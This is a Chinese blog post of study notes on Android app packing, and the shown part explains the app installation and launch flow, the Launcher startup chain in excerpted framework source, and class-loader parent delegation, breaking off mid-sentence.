    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>只做学习记录的备份，来自于</p><p><a href="https://bbs.kanxue.com/thread-273293.htm">[原创]Android漏洞之战（11）——整体加壳原理和脱壳技巧详解</a> </p><p><a href="https://www.52pojie.cn/home.php?mod=space&uid=1109458">《安卓逆向这档事》</a></p><h2 id="Android-App启动流程"><a href="#Android-App启动流程" class="headerlink" title="Android App启动流程"></a>Android App启动流程</h2><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202510111544534.png" alt="image-20250928213056553" style="zoom:50%;" /><p><code>Zygote</code>进程fork的第一个进程是：<code>SystemServer</code>进程，<code>SystemServer</code>进程主要进行以下的工作</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202510111544536.png" alt="image-20250928213032187"  /><h3 id="Android-APP安装"><a href="#Android-APP安装" class="headerlink" title="Android APP安装"></a>Android APP安装</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">· 系统启动时安装，没有安装界面</span><br><span class="line">· 第三方应用安装，有安装界面，也是我们最熟悉的方式</span><br><span class="line">· ADB命令安装，没有安装界面</span><br><span class="line">· 通过各类应用市场安装，没有安装界面</span><br></pre></td></tr></table></figure><p>有这四种安装模式</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202510111544537.png" alt="image-20250928215538686"></p><p>但是都是通过<code>PackgeManagerService</code>服务来完成应用程序的安装的，而<code>PackgeManagerService</code>服务会与<code>installed</code>服务通信，发送具体的指令来执行应用程序的安装、卸载等工作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> IPackageManager <span class="title function_">main</span><span class="params">(Context context, Installer installer,</span></span><br><span class="line"><span class="params">    <span class="type">boolean</span> factoryTest, <span class="type">boolean</span> onlyCore)</span> &#123;</span><br><span class="line">        <span class="type">PackageManagerService</span> <span class="variable">m</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PackageManagerService</span>(context, installer, factoryTest, onlyCore);</span><br><span class="line">        ServiceManager.addService(<span class="string">&quot;package&quot;</span>, m);</span><br><span class="line">    <span class="keyword">return</span> m;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里的<code>PackgeManagerService</code>其实就是上述的<code>PackageManager</code>服务注册的</p></blockquote><p><code>IPackageManager</code>函数是Android系统中包管理服务的初始化入口，初始化<code>PackageManagerService</code>，将服务加入到系统服务管理器中，然后返回<code>PackgeManagerService</code>的实例供用户使用</p><p>应用程序在安装时涉及到如下几个重要目录：</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202510111544538.png" alt="image-20250928220334806"></p><p>App的安装流程是由<code>PackageManagerService</code>完成的，此前<code>SystemServer</code>就已经启动了一个更重要的服务<code>ActivityManagerService</code>，<code>ActivityManagerService</code>其中一个重要的作用就是在启动完<code>PackageManagerService</code>之后将<code>Launcher</code>进程启动起来</p><h4 id="Launcher启动流程"><a href="#Launcher启动流程" class="headerlink" title="Launcher启动流程"></a><a href="https://blog.csdn.net/itachi85/article/details/56669808">Launcher</a>启动流程</h4><p>启动<code>Launcher</code>的入口为<code>ActivityManagerService</code>的<code>systemReady</code>函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">startOtherServices</span><span class="params">()</span> &#123;</span><br><span class="line">...</span><br><span class="line">mActivityManagerService.systemReady(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            Slog.i(TAG, <span class="string">&quot;Making services ready&quot;</span>);</span><br><span class="line">            mSystemServiceManager.startBootPhase(</span><br><span class="line">                    SystemService.PHASE_ACTIVITY_MANAGER_READY);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>startOtherServices</code>函数中，会调用<code>ActivityManagerService</code>的<code>systemReady</code>函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">systemReady</span><span class="params">(<span class="keyword">final</span> Runnable goingCallback)</span> &#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">       ...</span><br><span class="line">        mStackSupervisor.resumeFocusedStackTopActivityLocked();</span><br><span class="line">        mUserController.sendUserSwitchBroadcastsLocked(-<span class="number">1</span>, currentUserId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>systemReady</code>函数中调用了<code>ActivityStackSupervisor</code>的<code>resumeFocusedStackTopActivityLocked</code>函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="title function_">resumeFocusedStackTopActivityLocked</span><span class="params">(</span></span><br><span class="line"><span class="params">        ActivityStack targetStack, ActivityRecord target, ActivityOptions targetOptions)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (targetStack != <span class="literal">null</span> &amp;&amp; isFocusedStack(targetStack)) &#123;</span><br><span class="line">        <span class="keyword">return</span> targetStack.resumeTopActivityUncheckedLocked(target, targetOptions); <span class="comment">//1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">ActivityRecord</span> <span class="variable">r</span> <span class="operator">=</span> mFocusedStack.topRunningActivityLocked();</span><br><span class="line">    <span class="keyword">if</span> (r == <span class="literal">null</span> || r.state != RESUMED) &#123;</span><br><span class="line">        mFocusedStack.resumeTopActivityUncheckedLocked(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在注释1处会调用<code>ActivityStack</code>的<code>resumeTopActivityUncheckedLocked</code>函数，<code>ActivityStack</code>对象是用来描述<code>Activity</code>堆栈的，<code>resumeTopActivityUncheckedLocked</code>函数如下所示。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="title function_">resumeTopActivityUncheckedLocked</span><span class="params">(ActivityRecord prev, ActivityOptions options)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (mStackSupervisor.inResumeTopActivity) &#123;</span><br><span class="line">        <span class="comment">// Don&#x27;t even start recursing.</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// Protect against recursion.</span></span><br><span class="line">        mStackSupervisor.inResumeTopActivity = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (mService.mLockScreenShown == ActivityManagerService.LOCK_SCREEN_LEAVING) &#123;</span><br><span class="line">            mService.mLockScreenShown = ActivityManagerService.LOCK_SCREEN_HIDDEN;</span><br><span class="line">            mService.updateSleepIfNeededLocked();</span><br><span class="line">        &#125;</span><br><span class="line">        result = resumeTopActivityInnerLocked(prev, options);<span class="comment">//1</span></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        mStackSupervisor.inResumeTopActivity = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>调用了<code>resumeTopActivityInnerLocked</code>函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">resumeTopActivityInnerLocked</span><span class="params">(ActivityRecord prev, ActivityOptions options)</span> &#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">return</span> isOnHomeDisplay() &amp;&amp;</span><br><span class="line">                    mStackSupervisor.resumeHomeStackTask(returnTaskType, prev, <span class="string">&quot;prevFinished&quot;</span>);</span><br><span class="line">...                 </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用<code>ActivityStackSupervisor</code>的<code>resumeHomeStackTask</code>函数，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="title function_">resumeHomeStackTask</span><span class="params">(<span class="type">int</span> homeStackTaskType, ActivityRecord prev, String reason)</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (r != <span class="literal">null</span> &amp;&amp; !r.finishing) &#123;</span><br><span class="line">        mService.setFocusedActivityLocked(r, myReason);</span><br><span class="line">        <span class="keyword">return</span> resumeFocusedStackTopActivityLocked(mHomeStack, prev, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> mService.startHomeActivityLocked(mCurrentUser, myReason);<span class="comment">//1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用了<code>ActivityManagerService</code>的<code>startHomeActivityLocked</code>函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="title function_">startHomeActivityLocked</span><span class="params">(<span class="type">int</span> userId, String reason)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (mFactoryTest == FactoryTest.FACTORY_TEST_LOW_LEVEL</span><br><span class="line">            &amp;&amp; mTopAction == <span class="literal">null</span>) &#123;<span class="comment">//1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getHomeIntent();<span class="comment">//2</span></span><br><span class="line">    <span class="type">ActivityInfo</span> <span class="variable">aInfo</span> <span class="operator">=</span> resolveActivityInfo(intent, STOCK_PM_FLAGS, userId);</span><br><span class="line">    <span class="keyword">if</span> (aInfo != <span class="literal">null</span>) &#123;</span><br><span class="line">        intent.setComponent(<span class="keyword">new</span> <span class="title class_">ComponentName</span>(aInfo.applicationInfo.packageName, aInfo.name));</span><br><span class="line">        aInfo = <span class="keyword">new</span> <span class="title class_">ActivityInfo</span>(aInfo);</span><br><span class="line">        aInfo.applicationInfo = getAppInfoForUser(aInfo.applicationInfo, userId);</span><br><span class="line">        <span class="type">ProcessRecord</span> <span class="variable">app</span> <span class="operator">=</span> getProcessRecordLocked(aInfo.processName,</span><br><span class="line">                aInfo.applicationInfo.uid, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (app == <span class="literal">null</span> || app.instrumentationClass == <span class="literal">null</span>) &#123;<span class="comment">//3</span></span><br><span class="line">            intent.setFlags(intent.getFlags() | Intent.FLAG_ACTIVITY_NEW_TASK);</span><br><span class="line">            mActivityStarter.startHomeActivityLocked(intent, aInfo, reason);<span class="comment">//4</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Slog.wtf(TAG, <span class="string">&quot;No home screen found for &quot;</span> + intent, <span class="keyword">new</span> <span class="title class_">Throwable</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注释1处的<code>mFactoryTest</code>代表<strong>系统的运行模式</strong>，系统的运行模式分为三种，分别是<strong>非工厂模式、低级工厂模式和高级工厂模式</strong>，<code>mTopAction</code>则用来描述<strong>第一个</strong>被启动Activity组件的<code>Action</code>，它的值为<code>Intent.ACTION_MAIN</code>。</p><p>因此注释1的代码意思就是<code>mFactoryTest</code>为<code>FactoryTest.FACTORY_TEST_LOW_LEVEL</code>（低级工厂模式）并且<code>mTopAction=null</code>时，直接返回false。注释2处的<code>getHomeIntent</code>函数如下所示。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Intent <span class="title function_">getHomeIntent</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(mTopAction, mTopData != <span class="literal">null</span> ? Uri.parse(mTopData) : <span class="literal">null</span>);</span><br><span class="line">    intent.setComponent(mTopComponent);</span><br><span class="line">    intent.addFlags(Intent.FLAG_DEBUG_TRIAGED_MISSING);</span><br><span class="line">    <span class="keyword">if</span> (mFactoryTest != FactoryTest.FACTORY_TEST_LOW_LEVEL) &#123;</span><br><span class="line">        intent.addCategory(Intent.CATEGORY_HOME);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> intent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>getHomeIntent</code>函数中创建了<code>Intent</code>，并将<code>mTopAction</code>和<code>mTopData</code>传入。<code>mTopAction</code>的值为<code>Intent.ACTION_MAIN</code>，并且如果系统运行模式不是低级工厂模式则将<code>intent</code>的<code>Category</code>设置为<code>Intent.CATEGORY_HOME</code></p><p>我们再回到<code>ActivityManagerService</code>的<code>startHomeActivityLocked</code>函数</p><p>假设系统的运行模式不是低级工厂模式，在注释3处判断符合<code>Action</code>为<code>Intent.ACTION_MAIN</code>，<code>Category</code>为<code>Intent.CATEGORY_HOME</code>的应用程序是否已经启动，如果没启动则调用注释4的方法启动该应用程序。</p><p>这个被启动的应用程序就是<code>Launcher</code>，因为<code>Launcher</code>的<code>Manifest</code>文件中的<code>intent-filter</code>标签匹配了<code>Action</code>为<code>Intent.ACTION_MAIN</code>，<code>Category</code>为<code>Intent.CATEGORY_HOME</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">manifest</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">package</span>=<span class="string">&quot;com.android.launcher3&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-sdk</span> <span class="attr">android:targetSdkVersion</span>=<span class="string">&quot;23&quot;</span> <span class="attr">android:minSdkVersion</span>=<span class="string">&quot;16&quot;</span>/&gt;</span></span><br><span class="line"> ...</span><br><span class="line"> <span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">        <span class="attr">...</span></span></span><br><span class="line"><span class="tag">        &lt;<span class="attr">activity</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;com.android.launcher3.Launcher&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:launchMode</span>=<span class="string">&quot;singleTask&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:clearTaskOnLaunch</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:stateNotNeeded</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:windowSoftInputMode</span>=<span class="string">&quot;adjustPan&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:screenOrientation</span>=<span class="string">&quot;nosensor&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:configChanges</span>=<span class="string">&quot;keyboard|keyboardHidden|navigation&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:resumeWhilePausing</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:taskAffinity</span>=<span class="string">&quot;&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.HOME&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.DEFAULT&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.MONKEY&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">...</span><br><span class="line">  <span class="tag">&lt;/<span class="name">application</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span>         </span><br></pre></td></tr></table></figure><p>之后<code>Launcher</code>就会开始执行<code>onCreate</code>了</p><h4 id="App启动流程"><a href="#App启动流程" class="headerlink" title="App启动流程"></a>App启动流程</h4><p>应用程序<code>Launcher</code>在启动过程中会请求<code>PackageManagerService</code>返回系统中已经安装的应用程序的信息，并将这些信息封装成一个快捷图标列表显示在系统屏幕上，这样用户可以通过点击这些快捷图标来启动相应的应用程序</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202510111544539.png" alt="image-20250928223841904"></p><ol><li>点击桌面APP图标时，Launcher的<code>startActivity()</code>方法，通过<code>Binder</code>通信，调用system_server进程中AMS服务的<code>startActivity</code>方法，<strong>发起启动请求</strong></li><li><code>system_server</code>进程接收到请求后，向<code>Zygote</code>进程<strong>发送创建进程的请求</strong></li><li>Zygote进程fork出App进程，并执行<code>ActivityThread</code>的main方法，创建ActivityThread线程，初始化<code>MainLooper</code>，主线程Handler，同时<strong>初始化ApplicationThread用于和AMS通信交互</strong></li><li>App进程，通过Binder向sytem_server进程发起<code>attachApplication</code>请求，这里实际上就是APP进程<strong>通过Binder调用sytem_server进程中AMS的attachApplication方法</strong>,AMS的attachApplication方法的作用是<strong>将ApplicationThread对象与AMS绑定</strong></li><li>system_server进程在收到attachApplication的请求，进行一些准备工作后，再通过binder IPC向App进程<strong>发送handleBindApplication请求</strong>（初始化Application并调用onCreate方法）和scheduleLaunchActivity请求（创建启动Activity）</li><li>App进程的binder线程（ApplicationThread）在收到请求后，<strong>通过handler向主线程发送BIND_APPLICATION和LAUNCH_ACTIVITY消息</strong>，这里注意的是AMS和主线程并不直接通信，而是AMS和主线程的内部类<code>ApplicationThread</code>通过Binder通信，<code>ApplicationThread</code>再和主线程通过Handler消息交互。</li><li>主线程在收到Message后，<strong>创建Application并调用onCreate方法</strong>，再通过反射机制创建目标Activity，并回调<code>Activity.onCreate()</code>等方法</li><li>到此，App便正式启动，开始进入Activity生命周期，执行完<code>onCreate/onStart/onResume</code>方法，UI渲染后显示APP主界面</li></ol><p>这里我们就进入了加壳中十分重要的地方<code>ActivityTread</code>，之后就是调用各种函数来启动APP，过程如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">App的运行流程是</span><br><span class="line">    初始化————&gt;Application的构造函数————&gt;Application.attachBaseContext()————&gt;Application.onCreate()函数</span><br></pre></td></tr></table></figure><p>最后才会进入<code>MainActivity</code>中的<code>attachBaseContext</code>函数、<code>onCreate</code>函数</p><p>所以加壳厂商要在程序正式执行前，也就是上面的流程中进行<strong>动态加载和类加载器的修正</strong>，这样才能对加密的dex进行释放，而一般的厂商往往选择在<strong>Application中的attachBaseContext或onCreate函数</strong>进行</p><h2 id="整体加壳原理详解"><a href="#整体加壳原理详解" class="headerlink" title="整体加壳原理详解"></a>整体加壳原理详解</h2><h3 id="深入理解类加载器和动态加载"><a href="#深入理解类加载器和动态加载" class="headerlink" title="深入理解类加载器和动态加载"></a>深入理解类加载器和动态加载</h3><p>在学习如何对App加上一层外壳之前，需要详细了解<strong>类加载器和动态加载</strong>的机制</p><h4 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h4><p>Android中的类加载器机制与JVM一样遵循双亲委派模式</p><h5 id="双亲委派模式"><a href="#双亲委派模式" class="headerlink" title="双亲委派模式"></a>双亲委派模式</h5><p>代码解释：</p><ol><li><p>首先检查该类是否已被加载</p></li><li><p>若未加载，则委托给父类的<code>Loader</code>加载，如果没有父类则委托给<code>BootClassLoader</code>尝试加载</p></li><li><p>若<code>BootClassLoader</code>无法加载，则<code>PathClassLoader</code>尝试从应用的dex文件中加载</p></li><li><p>若需要动态加载外部dex，则使用<code>DexClassLoader</code></p></li></ol><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202510111544540.png" alt="image-20250929131650468" style="zoom:33%;" /><p><strong>双亲委派模式加载</strong></p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202510111544541.png" alt="image-20250929132247135" style="zoom:50%;" /><p>我们要加载一个<code>class</code>文件，我们定义了一个<code>CustomerClassLoader</code>类加载器:<br>(1)首先会判断自己的<code>CustomerClassLoader</code>否加载过,如果加载过直接返回,<br>(2)如果没有加载过则会调用父类<code>PathClassLoader</code>去加载,该父类同样会<strong>判断</strong>自己是否加载过,如果没有加载过则委托给父类<code>BootClassLoader</code>去加载,<br>(3)这个<code>BootClassLoader</code>是顶级<code>classLoader</code>,同样会去<strong>判断</strong>自己有没有加载过,如果也没有加载过则会调用自己的<code>findClass(name)</code>去加载,<br>(4)如果顶级<code>BootClassLoader</code>加载<strong>失败</strong>了,则会把加载这个动作<strong>向下交还</strong>给<code>PathClassLoader</code>,<br>(5)这个<code>PathClassLoader</code>也会尝试去调用<code>findClass(name);</code>去加载,如果加载失败了,则会继续向下交还给<code>CustomClassLoader</code>来完成加载,这整个过程感觉是一个<strong>递归</strong>的过程,逐渐往上然后有逐渐往下,直到加载成功<br>其实这个<code>String.class</code>在系统启动的时候已经被加载了,我们自己定义一个<code>CustomerClassLoader</code>去加载,其实也是父类加载的</p><h5 id="Android中类加载机制"><a href="#Android中类加载机制" class="headerlink" title="Android中类加载机制"></a>Android中类加载机制</h5><p>Android的类加载机制和JVM一样遵循双亲委派模式，在dalvik&#x2F;art启动时将所有Java基本类和Android系统框架的基本类加载进来，预加载的类记录在<code>/frameworks/base/config/preloaded-classes</code>中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">android.R$styleable</span><br><span class="line">android.accessibilityservice.AccessibilityServiceInfo$<span class="number">1</span></span><br><span class="line">android.accessibilityservice.AccessibilityServiceInfo</span><br><span class="line">android.accessibilityservice.IAccessibilityServiceClient$Stub$Proxy</span><br><span class="line">android.accessibilityservice.IAccessibilityServiceClient$Stub</span><br><span class="line">android.accessibilityservice.IAccessibilityServiceClient</span><br><span class="line">android.accounts.AbstractAccountAuthenticator$Transport</span><br><span class="line">android.accounts.AbstractAccountAuthenticator</span><br><span class="line">android.accounts.Account$<span class="number">1</span></span><br><span class="line">android.accounts.Account</span><br><span class="line">...</span><br><span class="line"> </span><br><span class="line">java.lang.Short</span><br><span class="line">java.lang.StackOverflowError</span><br><span class="line">java.lang.StackTraceElement</span><br><span class="line">java.lang.StrictMath</span><br><span class="line">java.lang.String$<span class="number">1</span></span><br><span class="line">java.lang.String$CaseInsensitiveComparator</span><br><span class="line">java.lang.String</span><br><span class="line">java.lang.StringBuffer</span><br><span class="line">java.lang.StringBuilder</span><br><span class="line">java.lang.StringFactory</span><br><span class="line">java.lang.StringIndexOutOfBoundsException</span><br><span class="line">java.lang.System$PropertiesWithNonOverrideableDefaults</span><br><span class="line">java.lang.System</span><br><span class="line">java.lang.Thread$<span class="number">1</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>这些类只需要在Zygote进程启动时加载一遍就可以了，后续每一个APP或Android运行时环境的进程，都是从Zygote中<code>fork</code>出来，天然保留了加载过的类缓存</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202510111544542.png" alt="image-20250929133634773"></p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202510111544543.png" alt="image-20250929134222740"></p><p>Android中的<code>ClassLoader</code>类型分为<strong>系统ClassLoader</strong>和<strong>自定义ClassLoader</strong>。其中<strong>系统ClassLoader</strong>包括3种是<code>BootClassLoader</code>、<code>DexClassLoader</code>、<code>PathClassLoader</code></p><ol><li><code>BootClassLoader</code>:Android平台上所有Android系统启动时会使用BootClassLoader来预加载常用的类</li><li><code>BaseDexClassLoader</code>:实际应用层类文件的加载，而真正的加载委托给pathList来完成</li><li><code>DexClassLoader</code>:可以加载dex文件以及包含dex的压缩文件(apk,dex,jar,zip),可以安装一个未安装的apk文件，一般为自定义类加载器</li><li><code>PathClassLoader</code>:可以加载系统类和应用程序的类，通常用来加载已安装的apk的dex文件</li></ol><blockquote><p>Android 提供的原生加载器叫做<strong>基础类加载器</strong>，包括：<code>BootClassLoader，PathClassLoader，DexClassLoader，InMemoryDexClassLoader</code>（Android 8.0 引入）</p><p><code>DelegateLastClassLoader</code>（Android 8.1 引入）</p></blockquote><h5 id="BootClassLoader"><a href="#BootClassLoader" class="headerlink" title="BootClassLoader"></a>BootClassLoader</h5><p>启动类加载器，用于加载 <code>Zygote</code> 进程已经预加载的基本类，可以推测它只需从缓存中加载。这是基类 <code>ClassLoader</code> 